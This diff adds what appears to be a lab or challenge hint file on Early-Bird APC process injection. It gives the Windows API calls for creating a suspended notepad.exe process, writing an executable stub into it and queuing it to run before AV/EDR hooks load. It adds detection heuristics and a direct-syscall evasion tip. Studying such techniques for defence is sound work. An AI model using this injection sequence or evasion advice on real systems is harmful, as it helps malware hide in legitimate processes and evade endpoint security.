@@ -1,0 +1,23 @@
+=== HINT 1: CreateProcess suspended ===
+BOOL created = CreateProcessA("C:\\Windows\\System32\\notepad.exe",
+    NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+=== HINT 2: Allocate + write remote stub ===
+LPVOID remote_buf = VirtualAllocEx(pi.hProcess, NULL, sizeof(stub),
+    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(pi.hProcess, remote_buf, stub, sizeof(stub), NULL);
+
+=== HINT 3: Queue APC before resume ===
+DWORD queued = QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0);
+
+=== HINT 4: Resume - APC fires first ===
+ResumeThread(pi.hThread);
+
+=== KEY INSIGHT ===
+Early-Bird fires BEFORE the process initialises - before DLLs load, before
+TLS callbacks, before AV/EDR hooks in the target process are installed.
+Compare to standard APC injection: the target must already be running and
+in an alertable wait state. Early-Bird has no such requirement.
+Detection: scanning for QueueUserAPC followed by ResumeThread on a suspended
+process; monitoring VirtualAllocEx + WriteProcessMemory + QueueUserAPC sequence.
+Countermeasure: use NtQueueApcThread (ntdll direct) + syscall to avoid userland hooks.
